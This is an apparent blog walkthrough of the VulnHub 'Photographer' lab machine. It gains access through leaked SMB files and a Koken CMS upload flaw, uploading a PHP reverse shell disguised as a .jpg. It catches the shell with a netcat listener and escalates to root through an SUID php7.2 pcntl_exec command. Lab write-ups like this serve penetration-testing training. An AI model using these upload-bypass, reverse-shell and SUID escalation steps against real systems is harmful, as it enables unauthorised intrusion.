### Overview

Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by [v1n1v131r4](https://twitter.com/v1n1v131r4).

### Nmap

Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.

The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.

### Enumeration

I started with port 80 but didn't find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I'm presented with a CMS type page. Looking at the footer indicates 'Built with Koken'.

![Port 8000](/assets/images/photographer/Port-8000.png)

A quick Google shows [Koken](http://koken.me/) is a CMS for photographers. An [exploit](https://www.exploit-db.com/exploits/48706) is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication. 

![Exploit](/assets/images/photographer/exploit.png)

Looking at the exploit, the POST request makes a call to **/admin/**. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.

![Login](/assets/images/photographer/login.png)

Using smbclient and logging in anonymously shows one share in particular that looks interesting 'sambashare'.

Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.

Hi Daisa!
Your site is ready now.
Don\'t forget your secret, my babygirl ;)
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $
```

'babygirl' looks to be a hint to the password and I now have 2 users and email addresses:

- Agi Clarence - agi@photographer.com
- Daisa Ahomi - daisa@photographer.com

### Foot hold

I go back to port **8000/admin/** and try them out. I get straight in with **daisa@photographer.com** and **babygirl**. 

![CMS](/assets/images/photographer/cms.png)

Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).


```highlight
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $mv php-reverse-shell.php shell.php.jpg
```

I update the script with my local IP and port details.

```highlight
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Start a netcat listener ready to catch the shell.

```highlight
┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
└──╼ $sudo nc -nvlp 443
listening on [any] 443 ...
```

Going back to the admin page I upload the file using 'Import content' and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select 'Import'.

![Content](/assets/images/photographer/content.png)

In Burp I can now remove the .jpg extension from the file and forward the request.

![Burp](/assets/images/photographer/burp.png)

With the file selected, right clicking on 'Download File' and 'Open Link in New Tab' should run out PHP script. 

![DownloadFile](/assets/images/photographer/downloadfile.png)

I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.

![Shell](/assets/images/photographer/shell.png)

The first flag can be found in Daisa's user directory.

```highlight
www-data@photographer:/$ cd home/daisa/
www-data@photographer:/home/daisa$ ls
Desktop    Downloads  Pictures  Templates  examples.desktop
Documents  Music      Public    Videos     user.txt
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00{REDACTED}
www-data@photographer:/home/daisa$
```


### Privilege Escalation

I now need to escalate out of www-data to either a user or root. Im going to use [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.

![linpeas](/assets/images/photographer/linpeas.png)

Linpeas provides a lot of output, looking through the output **/usr/bin/php7.2** jumps out. 

> Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.

![suid](/assets/images/photographer/suid.png)

First I will check [GTFOBins](https://gtfobins.github.io), searching PHP.

![gtfobins](/assets/images/photographer/phpsuid.png)

Lets give it a go.

```highlight
www-data@photographer:/tmp$ CMD="/bin/sh"
www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
root
#
```

We have root! Lets grab the flag.


```highlight
# 
# cd /root
# cat proof.txt
